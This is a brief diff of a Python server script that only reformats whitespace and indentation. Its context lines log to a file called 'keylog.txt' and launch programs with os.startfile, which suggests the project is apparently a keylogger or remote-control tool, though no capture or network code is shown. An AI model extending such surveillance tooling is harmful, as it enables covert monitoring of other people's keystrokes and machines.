@@ -30,7 +30,6 @@ BUFFER_SIZE = 1024
 # TMP
 TMP_PATH = os.path.join(os.getcwd(), 'tmp')
 
-
 #LOGGING
 logging.basicConfig(filename = (os.path.join(TMP_PATH, "keylog.txt")), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
@@ -222,5 +221,5 @@ class Server:
     os.startfile(app_name)
 
 if __name__ == '__main__':
-  server = Server()
-  server.run()
+    server = Server()
+    server.run()
